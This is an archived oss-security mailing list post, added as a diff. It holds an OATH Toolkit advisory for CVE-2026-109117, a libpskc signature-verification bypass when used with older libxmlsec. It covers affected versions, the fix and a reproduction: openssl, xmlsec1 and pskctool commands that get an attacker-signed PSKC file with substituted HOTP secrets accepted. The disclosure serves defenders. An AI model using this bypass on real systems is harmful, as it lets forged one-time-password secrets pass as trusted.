@@ -1,0 +1,345 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Re: OATH Toolkit PSKC Signature Verification bypass in libpskc
+ (CVE-2026-109117)</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="11">[&lt;prev]</a> <a href="../../../2026/11/03/1">[next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;878q3avqsy.fsf&#64;josefsson.org&gt;
+Date: Mon, 02 Nov 2026 22:58:37 +0100
+From: Simon Josefsson &lt;simon&#64;...efsson.org&gt;
+To: oss-security&#64;...ts.openwall.com
+Subject: Re: OATH Toolkit PSKC Signature Verification bypass in libpskc
+ (CVE-2026-109117)
+
+FYI - also via <a href="https://oath-toolkit.codeberg.page/CVE-2026-109117.html" rel="nofollow">https://oath-toolkit.codeberg.page/CVE-2026-109117.html</a>
+
+/Simon
+
+Simon Josefsson via OATH Toolkit general discussions
+&lt;oath-toolkit-help&#64;...gnu.org&gt; writes:
+
+&gt; OATH Toolkit PSKC Signature Verification bypass in libpskc (CVE-2026-109117)
+&gt; ----------------------------------------------------------------------------
+&gt;
+&gt; Security Vulnerability
+&gt; ----------------------
+&gt;
+&gt; OATH Toolkit provides a library for handling PSKC data called
+&gt; 'libpskc', and a command-line tool 'pskctool' that uses libpskc.
+&gt;
+&gt; PSKC is a XML data format defined in RFC 6030 that can be used to
+&gt; transport OATH HOTP/TOTP HMAC-SHA symmetric secret keys.  Libpskc
+&gt; relies on the XML Security Library (libxmlsec) for cryptographic
+&gt; signature verification of the PSKC data.
+&gt;
+&gt; The RFC 6030 specification section 7 available from
+&gt; <a href="https://datatracker.ietf.org/doc/html/rfc6030#section-7" rel="nofollow">https://datatracker.ietf.org/doc/html/rfc6030#section-7</a> is not clear
+&gt; what the purpose and goal of adding a Digital Signature on PSKC data
+&gt; is, nor what the threat model is.  It could be argued that rather than
+&gt; authenticating the data for trust purposes, the goal of a PSKC
+&gt; signature could be to provide integrity protection of the content and
+&gt; a data origin identification.
+&gt;
+&gt; The libxmlsec library before v1.3.3 allowed the XML data to provide a
+&gt; key that will be used to verify the signature, instead of the key
+&gt; provided by the library/application.  Version 1.3.3 of libxmlsec
+&gt; changed so that it no longer trusts the key data inside the XML data
+&gt; by default.
+&gt;
+&gt; PSKC data is rarely encrypted (and OATH Toolkit do not support PSKC
+&gt; encryption), therefore deployments require some outer protection of
+&gt; the PSKC data to protect the OATH HOTP/TOTP secrets from leaking
+&gt; during transport.  SSH and HTTPS are typical transport protocols used
+&gt; for this, although offline physical transports (e.g., USB memory
+&gt; devices) is common from production facilities.
+&gt;
+&gt; However, if an attacker is able to circumvent the outer transport
+&gt; protection and substitute their own PSKC data to a system that relies
+&gt; on PSKC Signature Verification before trusting the incoming PSKC data,
+&gt; the attacker would be able to substitute their own OATH HOTP/TOTP
+&gt; secrets or otherwise cause the system to process the incoming PSKC
+&gt; data as trustworthy.
+&gt;
+&gt; The problem only occurs when OATH Toolkit's libpskc is linked to
+&gt; libxmlsec older than 1.3.3, which was released on 2024-01-04.  The
+&gt; release notes for libxmlsec says:
+&gt;
+&gt;     (xmlsec-core) Disabled KeyValue and DEREncodedKeyValue XML nodes
+&gt;     by default. Use the '--enabled-key-data' option for the xmlsec
+&gt;     command line utility or update the 'keyInfoCtx.enabledKeyData'
+&gt;     parameter if you need to re-enable these nodes (also see question
+&gt;     3.5 in the FAQ).
+&gt;
+&gt; The FAQ at <a href="https://www.aleksey.com/xmlsec/faq.html" rel="nofollow">https://www.aleksey.com/xmlsec/faq.html</a> state that the old
+&gt; the behaviour is **INSECURE AND NOT RECOMMENDED**.  Therefore we
+&gt; consider the underlying cause to be a libxmlsec security problem,
+&gt; which ought to have been patched and deployed earlier.
+&gt;
+&gt; We encourage further research into other applications using libxmlsec
+&gt; that may be similarly affected.  An earlier report from 2013 exists:
+&gt; <a href="https://www.aleksey.com/pipermail/xmlsec/2013/009717.html" rel="nofollow">https://www.aleksey.com/pipermail/xmlsec/2013/009717.html</a>
+&gt;
+&gt; Many distributions and deployments still uses libxmlsec 1.2.x
+&gt; including Debian 12 (1.2.37), Debian 13 (1.2.41), Ubuntu 22.04
+&gt; (1.2.33), Ubuntu 24.04 (1.2.39) and RHEL 9 (1.2.33).
+&gt;
+&gt; We are not aware of any active exploits in the wild of this flaw, and
+&gt; because of the outer protection required for PSKC data we do not know
+&gt; of, or can conceive, any realistic scenario where this problem could
+&gt; be exploited.
+&gt;
+&gt; We acknowledge that this may be considered a problem in OATH Toolkit,
+&gt; and publish this advisory and a set of patches that prevents the
+&gt; problem from occurring when libpskc is used with older libxmlsec.
+&gt;
+&gt; Severity: low.  Likely no practical implications.
+&gt;
+&gt; Affected versions and configurations
+&gt; ------------------------------------
+&gt;
+&gt; Support for sign/verify of PSKC data was introduced in version 2.0.1
+&gt; released on 2012-10-24 and not fixed up to and including 2.6.14
+&gt; released on 2026-01-27.  Version 2.6.15 released on 2026-10-13
+&gt; prevents the problem.
+&gt;
+&gt; Reproduce
+&gt; ---------
+&gt;
+&gt; First create a baseline, with a sample PSKC file.
+&gt;
+&gt;   cat&lt;&lt;EOF&gt;pskc.xml
+&gt;   &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&gt;   &lt;KeyContainer Version="1.0" xmlns="urn:ietf:params:xml:ns:keyprov:pskc"&gt;
+&gt;     &lt;KeyPackage&gt;
+&gt;       &lt;DeviceInfo&gt;
+&gt;         &lt;Manufacturer&gt;Manufacturer&lt;/Manufacturer&gt;
+&gt;         &lt;SerialNo&gt;987654321&lt;/SerialNo&gt;
+&gt;       &lt;/DeviceInfo&gt;
+&gt;       &lt;Key Id="12345678"
+&gt;            Algorithm="urn:ietf:params:xml:ns:keyprov:pskc:hotp"&gt;
+&gt;         &lt;AlgorithmParameters&gt;
+&gt;           &lt;ResponseFormat Length="8" Encoding="DECIMAL"/&gt;
+&gt;         &lt;/AlgorithmParameters&gt;
+&gt;         &lt;Data&gt;
+&gt;           &lt;Secret&gt;
+&gt;             &lt;PlainValue&gt;MTIzNDU2Nzg5MDEyMzQ1Njc4OTA=
+&gt;             &lt;/PlainValue&gt;
+&gt;           &lt;/Secret&gt;
+&gt;           &lt;Counter&gt;
+&gt;             &lt;PlainValue&gt;0&lt;/PlainValue&gt;
+&gt;           &lt;/Counter&gt;
+&gt;         &lt;/Data&gt;
+&gt;       &lt;/Key&gt;
+&gt;     &lt;/KeyPackage&gt;
+&gt;   &lt;/KeyContainer&gt;
+&gt;   EOF
+&gt;
+&gt; Create a new trusted key and cert:
+&gt;
+&gt;   openssl req -x509 -newkey rsa:2048 -nodes -keyout trusted.key -out trusted.crt -days 3650 -subj "/CN=Trusted PSKC Signer"
+&gt;
+&gt; Sign the PSKC data:
+&gt;
+&gt;   pskctool --sign --sign-key trusted.key --sign-crt trusted.crt pskc.xml &gt; signed-legit.xml
+&gt;
+&gt; Confirm verification works fine:
+&gt;
+&gt;   pskctool --verify --verify-crt trusted.crt signed-legit.xml
+&gt;   OK
+&gt;
+&gt; Now simulate an attacker that uses a XML template like this:
+&gt;
+&gt;   cat&lt;&lt;EOF&gt;attack-template.xml
+&gt;   &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&gt;     &lt;KeyContainer Version="1.0" Id="KC0001" xmlns="urn:ietf:params:xml:ns:keyprov:pskc"&gt;
+&gt;      &lt;KeyPackage&gt;
+&gt;       &lt;Key Id="12345678" Algorithm="urn:ietf:params:xml:ns:keyprov:pskc:hotp"&gt;
+&gt;        &lt;Issuer&gt;Attacker&lt;/Issuer&gt;
+&gt;        &lt;Data&gt;
+&gt;         &lt;Secret&gt;
+&gt;          &lt;PlainValue&gt;QUJDREVGR0gK&lt;/PlainValue&gt;
+&gt;         &lt;/Secret&gt;
+&gt;        &lt;/Data&gt;
+&gt;       &lt;/Key&gt;
+&gt;      &lt;/KeyPackage&gt;
+&gt;      &lt;Signature xmlns="<a href="http://www.w3.org/2000/09/xmldsig#" rel="nofollow">http://www.w3.org/2000/09/xmldsig#</a>"&gt;
+&gt;       &lt;SignedInfo&gt;
+&gt;        &lt;CanonicalizationMethod Algorithm="<a href="http://www.w3.org/2001/10/xml-exc-c14n#" rel="nofollow">http://www.w3.org/2001/10/xml-exc-c14n#</a>"/&gt;
+&gt;        &lt;SignatureMethod Algorithm="<a href="http://www.w3.org/2000/09/xmldsig#rsa-sha1" rel="nofollow">http://www.w3.org/2000/09/xmldsig#rsa-sha1</a>"/&gt;
+&gt;        &lt;Reference URI=""&gt;
+&gt;         &lt;Transforms&gt;
+&gt;          &lt;Transform Algorithm="<a href="http://www.w3.org/2000/09/xmldsig#enveloped-signature" rel="nofollow">http://www.w3.org/2000/09/xmldsig#enveloped-signature</a>"/&gt;
+&gt;         &lt;/Transforms&gt;
+&gt;         &lt;DigestMethod Algorithm="<a href="http://www.w3.org/2000/09/xmldsig#sha1" rel="nofollow">http://www.w3.org/2000/09/xmldsig#sha1</a>"/&gt;
+&gt;         &lt;DigestValue/&gt;
+&gt;        &lt;/Reference&gt;
+&gt;       &lt;/SignedInfo&gt;
+&gt;       &lt;SignatureValue/&gt;
+&gt;       &lt;KeyInfo&gt;
+&gt;        &lt;KeyValue/&gt;
+&gt;       &lt;/KeyInfo&gt;
+&gt;      &lt;/Signature&gt;
+&gt;     &lt;/KeyContainer&gt;
+&gt;   EOF
+&gt;
+&gt; Create an attacker-controlled private key/cert and sign the PSKC data:
+&gt;
+&gt;   openssl req -x509 -newkey rsa:2048 -nodes -keyout attacker.key -out attacker.crt -days 3650 -subj "/CN=Attacker"
+&gt;   xmlsec1 --sign --privkey-pem attacker.key --output attack-signed.xml attack-template.xml
+&gt;
+&gt; Now witness that pskctool says it is properly signed:
+&gt;
+&gt;   pskctool --verify --verify-crt trusted.crt attack-signed.xml
+&gt;   OK
+&gt;
+&gt; If accepted by some processing entity, it would now trust the data and
+&gt; could rely on the OATH secret embedded in the file.
+&gt;
+&gt; Recommendation
+&gt; --------------
+&gt;
+&gt; We recommend you to review your outer PSKC data transport protection
+&gt; to confirm it provides authenticity, integrity and confidentiality of
+&gt; your data before it reaches libpskc/pskctool.
+&gt;
+&gt; As an additional precaution (if the outer protection fails), we
+&gt; recommend you to upgrade to OATH Toolkit 2.6.15 (or later) and/or
+&gt; upgrade libxmlsec to 1.3.3 (or later).  If upgrading is unpractical we
+&gt; recommended you to apply the relevant patches on the versions you use.
+&gt;
+&gt; Solution
+&gt; --------
+&gt;
+&gt; The patch we use is to restrict KeyValue to X509Data only:
+&gt;
+&gt; <a href="https://codeberg.org/oath-toolkit/oath-toolkit/commit/5000be81a938a3bc01fb1a4636e89c19588ce7fb" rel="nofollow">https://codeberg.org/oath-toolkit/oath-toolkit/commit/5000be81a938a3bc01fb1a4636e89c19588ce7fb</a>
+&gt;
+&gt; History
+&gt; -------
+&gt;
+&gt; Report by private e-mail from info &lt;info&#64;...surf&gt; on 2026-10-11.
+&gt; Correspondence about a proof-of-concept that lead to confirming the
+&gt; issue on 2026-10-12.  CVE assigned by GitLab on 2026-10-12.  Version
+&gt; 2.6.15 release on 2026-10-13.
+&gt;
+&gt; Credits
+&gt; -------
+&gt;
+&gt; Report by info &lt;info&#64;...surf&gt;, advisory and patch by Simon Josefsson.
+&gt;
+
+<span style="font-family: times;"><strong>Download attachment "</strong><a href="12/1" rel="nofollow" download>signature.asc</a><strong>" of type "</strong>application/pgp-signature<strong>" (1288 bytes)</strong></span>
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
